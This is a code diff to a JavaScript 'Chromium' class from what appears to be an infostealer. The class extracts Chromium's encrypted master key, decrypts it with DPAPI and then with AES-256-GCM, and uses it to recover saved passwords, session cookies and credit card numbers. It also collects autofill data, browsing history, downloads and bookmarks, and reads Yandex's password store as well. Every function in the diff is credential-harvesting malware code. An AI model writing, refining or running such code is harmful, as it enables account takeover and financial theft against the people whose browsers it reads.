@@ -1,26 +1,49 @@
-const fs = require("fs");
+const crypto = require('crypto');
 const path = require("path");
+const fs = require("fs");
 
-const cryptofy = require("./crypto.js");
 const query = require("./query.js");
+const cryptofy = require("./cryptofy.js");
+
 const structures = require("./structures");
 
-const ALL_SITES_VISITEDS = [];
-
 class Chromium {
-    GetSites = () => {
-        return ALL_SITES_VISITEDS;
+    decrypt = (encryptedPass, masterKey) => {
+        if (masterKey.length === 0) {
+            return cryptofy.DPAPI(encryptedPass, null, 'CurrentUser');
+        }
+
+        const bufferKey = Buffer.isBuffer(masterKey) ? masterKey : Buffer.from(masterKey, 'utf-8');
+        if (bufferKey.length !== 32) {
+            throw new Error("Key must be 32 bytes for AES-256");
+        };
+
+        const nonce = encryptedPass.slice(3, 15);
+        const encryptedData = encryptedPass.slice(15, -16);
+        const authTag = encryptedPass.slice(-16);
+
+        const decipher = crypto.createDecipheriv('aes-256-gcm', bufferKey, nonce);
+        decipher.setAuthTag(authTag);
+
+        let decryptedString = decipher.update(encryptedData, 'base64', 'utf-8');
+        decryptedString += decipher.final('utf-8');
+
+        return decryptedString;
     };
 
-    GetMasterKey = (chromiumPath) => {
+    GetMasterKey = async (chromiumPath) => {
         const localStatePath = path.join(chromiumPath, 'Local State')
         if (!fs.existsSync(localStatePath)) return null;
 
         try {
-            const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
-            const encryptedKey = localState.os_crypt?.encrypted_key;
+            const data = fs.readFileSync(localStatePath, 'utf8');
 
-            if (!encryptedKey) return '';
+            const parsedData = JSON.parse(data);
+            const encryptedKey = parsedData.os_crypt.encrypted_key;
+
+            if (!encryptedKey) {
+                return null;
+            };
 
             const decodedKeyBuffer = Buffer.from(encryptedKey, 'base64');
             const slicedKeyBuffer = decodedKeyBuffer.slice(5);
@@ -28,9 +51,9 @@ class Chromium {
 
             return decryptedKey;
         } catch (error) {
-            return null;
+            console.error(error);
         }
-    }
+    };
 
     GetDownloads = async (chromiumPathProfile) => {
         const HistoryFilePath = path.join(chromiumPathProfile, 'History');
@@ -39,13 +62,13 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(HistoryFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT target_path, tab_url, total_bytes FROM downloads');
+            const rows = await sqliteQuery.execute('SELECT * FROM downloads');
 
-            return rows.map(row => {
+            return rows.map(({ tab_url, target_path, total_bytes }) => {
                 return new structures.Download(
-                    row.tab_url,
-                    row.target_path,
-                    row.total_bytes
+                    tab_url,
+                    target_path,
+                    total_bytes
                 )
             }).filter(Boolean);
         } catch (error) {
@@ -60,14 +83,14 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(HistoryFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT url, title, visit_count, last_visit_time FROM urls');
+            const rows = await sqliteQuery.execute('SELECT * FROM urls');
 
-            return rows.map(row => {
+            return rows.map(({ url, title, visit_count, last_visit_time }) => {
                 return new structures.History(
-                    row.url,
-                    row.title,
-                    row.visit_count,
-                    row.last_visit_time
+                    url,
+                    title,
+                    visit_count,
+                    last_visit_time
                 )
             }).filter(Boolean);
         } catch (error) {
@@ -85,11 +108,11 @@ class Chromium {
             fs.copyFileSync(BookmarksFilePath, BookmarksFileTempPath);
             const bookmarksObjectJson = JSON.parse(fs.readFileSync(BookmarksFileTempPath, 'utf8'));
 
-            return bookmarksObjectJson?.roots?.bookmark_bar?.children.map(bookmark => {
+            return bookmarksObjectJson?.roots?.bookmark_bar?.children.map(({ url, name, date_added }) => {
                 return new structures.Bookmark(
-                    bookmark.url,
-                    bookmark.name,
-                    bookmark.date_added
+                    url,
+                    name,
+                    date_added
                 )
             });
         } catch (error) {
@@ -111,12 +134,12 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(WebDataFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT name, value FROM autofill');
+            const rows = await sqliteQuery.execute('SELECT * FROM autofill');
 
-            return rows.map(row => {
+            return rows.map(({ name, value }) => {
                 return new structures.Autofill(
-                    row.name,
-                    row.value
+                    name,
+                    value
                 )
             }).filter(Boolean);
         } catch (error) {
@@ -124,7 +147,7 @@ class Chromium {
         }
     };
 
-    GetLogins = async (chromiumPathProfile, MasterKey) => {
+    GetLogins = async (chromiumPathProfile, masterKey) => {
         const LoginDataFilePath = chromiumPathProfile.includes("Yandex")
             ? path.join(chromiumPathProfile, 'Ya Passman Data')
             : path.join(chromiumPathProfile, 'Login Data');
@@ -133,26 +156,29 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(LoginDataFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT origin_url, username_value, password_value, date_created FROM logins');
+            const rows = await sqliteQuery.execute('SELECT * FROM logins');
 
-            return rows.map(row => {
-                let password = row.password_value;
+            return rows.map(({ password_value, username_value, origin_url, date_created }) => {
+                let password = password_value;
+
                 try {
                     if (password) {
-                        password = cryptofy.decryptAES256GCM(MasterKey, password);
+                        password = this.decrypt(password, masterKey);
                     };
 
-                    ALL_SITES_VISITEDS.push({
-                        source: 'logins',
-                        origin_url: row.origin_url
-                    });
+                    if (username_value && password) {
+                        structures.BrowserStatistics.addSites({
+                            source: 'logins',
+                            origin_url: origin_url
+                        });
 
-                    return new structures.Login(
-                        row.origin_url,
-                        row.username_value,
-                        password,
-                        row.date_created
-                    );
+                        return new structures.Login(
+                            origin_url,
+                            username_value,
+                            password,
+                            date_created
+                        );
+                    }
                 } catch (error) {
                     return null;
                 }
@@ -162,30 +188,31 @@ class Chromium {
         }
     };
 
-    GetCreditCards = async (chromiumPathProfile, MasterKey) => {
+    GetCreditCards = async (chromiumPathProfile, masterKey) => {
         const WebDataFilePath = path.join(chromiumPathProfile, 'Web Data');
         if (!fs.existsSync(WebDataFilePath)) return [];
 
         const sqliteQuery = new query.SqliteQuery(WebDataFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT guid, name_on_card, card_number_encrypted, billing_address_id, nickname, expiration_month, expiration_year FROM credit_cards');
+            const rows = await sqliteQuery.execute('SELECT * FROM credit_cards');
 
-            return rows.map(row => {
-                let card_number = row.card_number_encrypted;
+            return rows.map(({ card_number_encrypted, guid, name_on_card, billing_address_id, nickname, expiration_month, expiration_year }) => {
+                let card_number = card_number_encrypted;
+
                 try {
                     if (card_number) {
-                        card_number = cryptofy.decryptAES256GCM(MasterKey, card_number);
+                        card_number = this.decrypt(card_number, masterKey);
                     };
 
                     return new structures.CreditCard(
-                        row.guid,
-                        row.name_on_card,
+                        guid,
+                        name_on_card,
                         card_number,
-                        row.billing_address_id,
-                        row.nickname,
-                        row.expiration_month,
-                        row.expiration_year
+                        billing_address_id,
+                        nickname,
+                        expiration_month,
+                        expiration_year
                     );
                 } catch (error) {
                     return null;
@@ -196,42 +223,43 @@ class Chromium {
         }
     };
 
-    GetCookies = async (chromiumPathProfile, MasterKey) => {
+    GetCookies = async (chromiumPathProfile, masterKey) => {
         const CookiesFilePath = path.join(chromiumPathProfile, 'Network', 'Cookies');
         if (!fs.existsSync(CookiesFilePath)) return [];
 
         const sqliteQuery = new query.SqliteQuery(CookiesFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies');
+            const rows = await sqliteQuery.execute('SELECT * FROM cookies');
 
-            return rows.map(row => {
-                let cookies = row.encrypted_value;
+            return rows.map(({ encrypted_value, host_key, path, is_secure, expires_utc, name }) => {
+                let cookies = encrypted_value;
+
                 try {
                     if (cookies) {
-                        cookies = cryptofy.decryptAES256GCM(MasterKey, cookies);
+                        cookies = this.decrypt(cookies, masterKey);
                     };
 
-                    ALL_SITES_VISITEDS.push({
+                    structures.BrowserStatistics.addSites({
                         source: 'cookies',
-                        origin_url: row.host_key
+                        origin_url: host_key
                     });
 
                     structures.BrowserStatistics.addCookies({
-                        host_key: row.host_key,
-                        path: row.path,
-                        is_secure: row.is_secure,
-                        expires_utc: row.expires_utc,
-                        name: row.name,
+                        host_key: host_key,
+                        path: path,
+                        is_secure: is_secure,
+                        expires_utc: expires_utc,
+                        name: name,
                         value: cookies
                     });
 
                     return new structures.Cookie(
-                        row.host_key,
-                        row.path,
-                        row.is_secure,
-                        row.expires_utc,
-                        row.name,
+                        host_key,
+                        path,
+                        is_secure,
+                        expires_utc,
+                        name,
                         cookies
                     );
                 } catch (error) {
